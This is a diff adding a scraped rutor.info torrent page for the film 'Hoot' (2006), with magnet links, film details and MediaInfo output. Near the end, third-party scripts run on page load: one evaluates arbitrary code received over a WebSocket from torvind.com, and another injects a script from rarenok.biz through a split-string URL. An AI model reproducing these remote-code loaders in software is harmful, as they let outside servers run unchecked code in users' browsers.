@@ -1,0 +1,471 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Крик совы / Hoot (2006) WEB-DL 720p | P</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Крик совы / Hoot (2006) WEB-DL 720p | P</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:029def346150f1306ae66621a51e1f87369ae8c3&amp;dn=rutor.info_%D0%9A%D1%80%D0%B8%D0%BA+%D1%81%D0%BE%D0%B2%D1%8B+%2F+Hoot+%282006%29+WEB-DL+720p+%7C+P&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=630523"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/630523"><img src="http://s.rutor.info/t/down.png"> Скачать Krik_sovy.2006.WEB-DL.720p.MVO.mkv.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://i105.fastpic.ru/big/2018/0508/f1/69b0ab0b649b0264325af4e43d584af1.jpg" /><br />
+<br />
+<u>Информация о фильме</u><br />
+<b>Название: </b>Крик совы<br />
+<b>Оригинальное название: </b>Hoot<br />
+<b>Год выхода: </b>2006<br />
+<b>Жанр: </b> <a href="/tag/1/комедия" target="_blank">комедия</a>, <a href="/tag/1/приключения" target="_blank">приключения</a>, <a href="/tag/1/семейный" target="_blank">семейный</a><br />
+<b>Режиссер: </b>Уил Шрайнер<br />
+<b>В ролях: </b>Люк Уилсон, Логан Лерман, Бри Ларсон, Тим Блейк Нельсон, Нил Флинн, Кларк Грегг, Кирстен Уоррен, Джессика Коффил, Дин Коллинз, Роберт Вагнер, Эрик Филлипс, Джимми Баффетт, Джон Арчи, Роберт Доннер<br />
+<br />
+<b>О фильме:</b> Школьник Рой Эберхардт переезжает вместе с семьёй из Монтаны во Флориду. Там он вместе с двумя новыми друзьями обнаружив угрозу местной популяции редких сов, бросает вызов жадным бизнессменам, продажным политикам и бездарным полицейским. Полные решимости защитить свою окружающую среду от губительного воздействия, друзья готовы на всё, чтобы не дать взрослым совершить большую ошибку.<br />
+<br /> <a href="http://www.kinopoisk.ru/level/1/film/100552/" target="_blank"><img src="http://www.kinopoisk.ru/rating/100552.gif" /></a><br />
+<br />
+<b>Страна: </b>США<br />
+<b>Продолжительность: </b>01:30:48<br />
+<b>Перевод: </b>Профессиональный (многоголосый закадровый) R5<br />
+<br />
+<u>Файл</u><br />
+<b>Кодек: </b>H264<br />
+<b>Качество: </b>WEB-DL 720p<br />
+<b>Видео: </b>MPEG4 AVC, 3 892 kb/s, 1280x692, 23.976fps<br />
+<b>Звук: </b><br />
+Аудио 1: Русский, AC3, 6 ch, 48 kHz, 448 kbps<br />
+Аудио 2: Английский, AC3, 6 ch, 48 kHz, 384 kbps<br />
+<b>Субтитры: </b>русские (R5), английские<br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты</div><div class="hidebody"></div><textarea class="hidearea"><a href="http://fastpic.ru/view/105/2018/0508/4e8aa5fc7f96d433546e5c57f23ad9a8.jpg.html" target="_blank"><img src="http://i105.fastpic.ru/thumb/2018/0508/a8/4e8aa5fc7f96d433546e5c57f23ad9a8.jpeg" /></a> <a href="http://fastpic.ru/view/105/2018/0508/54f6657771a2263a50c15899e9c1514c.jpg.html" target="_blank"><img src="http://i105.fastpic.ru/thumb/2018/0508/4c/54f6657771a2263a50c15899e9c1514c.jpeg" /></a> <a href="http://fastpic.ru/view/105/2018/0508/3baefe5e4299dc5ef58a005082644c25.jpg.html" target="_blank"><img src="http://i105.fastpic.ru/thumb/2018/0508/25/3baefe5e4299dc5ef58a005082644c25.jpeg" /></a> <a href="http://fastpic.ru/view/105/2018/0508/_914975d057ea0656d933b1628e272f53.jpg.html" target="_blank"><img src="http://i105.fastpic.ru/thumb/2018/0508/53/_914975d057ea0656d933b1628e272f53.jpeg" /></a></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">MediaInfo</div><div class="hidebody"></div><textarea class="hidearea">General<br />
+Unique ID                      : 189389526770786938702034203066030988553 (0x8E7B189871CB92C4969CC0443D799D09)<br />
+Complete name                  : d:DownloadsКрик совы.2006.WEB-DL.720p.MVO.mkv<br />
+Format                         : Matroska<br />
+Format version                 : Version 2<br />
+File size                      : 3.06 GiB<br />
+Duration                       : 1 h 30 min<br />
+Overall bit rate               : 4 820 kb/s<br />
+Encoded date                   : UTC 2013-11-07 00:07:17<br />
+Writing application            : mkvmerge v5.8.0 (&#039;No Sleep / Pillow&#039;) built on Sep  2 2012 15:37:04<br />
+Writing library                : libebml v1.2.3 + libmatroska v1.3.0<br />
+<br />
+Video<br />
+ID                             : 1<br />
+Format                         : AVC<br />
+Format/Info                    : Advanced Video Codec<br />
+Format profile                 : High@L3.1<br />
+Format settings                : 2 Ref Frames<br />
+Format settings, CABAC         : No<br />
+Format settings, ReFrames      : 2 frames<br />
+Codec ID                       : V_MPEG4/ISO/AVC<br />
+Duration                       : 1 h 30 min<br />
+Bit rate                       : 3 892 kb/s<br />
+Width                          : 1 280 pixels<br />
+Height                         : 692 pixels<br />
+Display aspect ratio           : 1.85:1<br />
+Frame rate mode                : Constant<br />
+Frame rate                     : 23.976 FPS<br />
+Color space                    : YUV<br />
+Chroma subsampling             : 4:2:0<br />
+Bit depth                      : 8 bits<br />
+Scan type                      : Progressive<br />
+Bits/(Pixel*Frame)             : 0.183<br />
+Stream size                    : 2.47 GiB (81%)<br />
+Language                       : English<br />
+Default                        : Yes<br />
+Forced                         : No<br />
+Color range                    : Limited<br />
+Color primaries                : BT.709<br />
+Transfer characteristics       : BT.709<br />
+Matrix coefficients            : BT.709<br />
+<br />
+Audio #1<br />
+ID                             : 2<br />
+Format                         : AC-3<br />
+Format/Info                    : Audio Coding 3<br />
+Codec ID                       : A_AC3<br />
+Duration                       : 1 h 30 min<br />
+Bit rate mode                  : Constant<br />
+Bit rate                       : 448 kb/s<br />
+Channel(s)                     : 6 channels<br />
+Channel positions              : Front: L C R, Side: L R, LFE<br />
+Sampling rate                  : 48.0 kHz<br />
+Frame rate                     : 31.250 FPS (1536 SPF)<br />
+Bit depth                      : 16 bits<br />
+Compression mode               : Lossy<br />
+Stream size                    : 291 MiB (9%)<br />
+Language                       : Russian<br />
+Service kind                   : Complete Main<br />
+Default                        : Yes<br />
+Forced                         : No<br />
+<br />
+Audio #2<br />
+ID                             : 3<br />
+Format                         : AC-3<br />
+Format/Info                    : Audio Coding 3<br />
+Codec ID                       : A_AC3<br />
+Duration                       : 1 h 30 min<br />
+Bit rate mode                  : Constant<br />
+Bit rate                       : 384 kb/s<br />
+Channel(s)                     : 6 channels<br />
+Channel positions              : Front: L C R, Side: L R, LFE<br />
+Sampling rate                  : 48.0 kHz<br />
+Frame rate                     : 31.250 FPS (1536 SPF)<br />
+Bit depth                      : 16 bits<br />
+Compression mode               : Lossy<br />
+Stream size                    : 249 MiB (8%)<br />
+Language                       : English<br />
+Service kind                   : Complete Main<br />
+Default                        : No<br />
+Forced                         : No<br />
+<br />
+Text #1<br />
+ID                             : 4<br />
+Format                         : UTF-8<br />
+Codec ID                       : S_TEXT/UTF8<br />
+Codec ID/Info                  : UTF-8 Plain Text<br />
+Language                       : Russian<br />
+Default                        : No<br />
+Forced                         : No<br />
+<br />
+Text #2<br />
+ID                             : 5<br />
+Format                         : UTF-8<br />
+Codec ID                       : S_TEXT/UTF8<br />
+Codec ID/Info                  : UTF-8 Plain Text<br />
+Language                       : English<br />
+Default                        : No<br />
+Forced                         : No<br />
+<br />
+Menu<br />
+00:00:00.000                   : en:Title<br />
+00:02:20.000                   : en:New Kid<br />
+00:06:41.000                   : en:Chasing Mullet<br />
+00:10:13.000                   : en:Vandalism<br />
+00:14:42.000                   : en:Stakeout<br />
+00:17:24.000                   : en:Confronting Bullies<br />
+00:20:37.000                   : en:Mullet&#039;s Hideout<br />
+00:24:42.000                   : en:Delivering Shoes<br />
+00:31:35.000                   : en:Muckle&#039;s 100th<br />
+00:37:03.000                   : en:Dana&#039;s Revenge<br />
+00:40:42.000                   : en:The Dog Bite<br />
+00:49:26.000                   : en:Nature Tour<br />
+00:54:07.000                   : en:Dana&#039;s Arrest<br />
+00:57:54.000                   : en:Overnight Guest<br />
+01:00:46.000                   : en:Missing Seat<br />
+01:04:29.000                   : en:The Plan<br />
+01:13:28.000                   : en:Ground Breaking<br />
+01:17:38.000                   : en:Roy&#039;s Speech<br />
+01:24:52.000                   : en:Happy Ending<br />
+01:26:47.000                   : en:Credits</textarea></div><b></b></td></tr>
+
+<tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr>
+<tr><td class="header">Категория</td><td><a href="/kino" target="_blank">Зарубежные фильмы</a></td></tr>
+<tr><td class="header">Раздают</td><td>5</td></tr>
+<tr><td class="header">Качают</td><td>4</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 8:19:06 (19 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 19:09:44  (13 часа назад)</td></tr>
+<tr><td class="header">Размер</td><td>3.06&nbsp;GB  (3282502385 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 630523);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630544"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:c514c4ff1100b255883de79d37f5bcd08256d53f&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630544/krik-sovy_hoot-2006-web-dlrip-avc-p">Крик совы / Hoot (2006) WEB-DLRip-AVC | P </a></td> 
+<td align="right">644.19&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;4</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630525"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:e1d49452695240aecbe7b2afe3a8a91e786565a1&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630525/krik-sovy_hoot-2006-web-dlrip-avc-p">Крик совы / Hoot (2006) WEB-DLRip-AVC | P </a></td> 
+<td align="right">1.79&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;4</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;5</span></td></tr><tr class="gai"><td>06&nbsp;Окт&nbsp;11</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/144370"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:f7dcfc3b913cd1b4837c8235e71e4a6e000c832a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/144370/krik-sovy_hoot-2006-dvdrip">Крик совы / Hoot (2006) DVDRip </a></td> 
+<td align="right">742.60&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/1/0/0/Hoot" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/630523.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (1)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=630523">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(630523);">Промодерировать раздачу</span> | <span onclick="confirm_delete(630523);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/630523">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
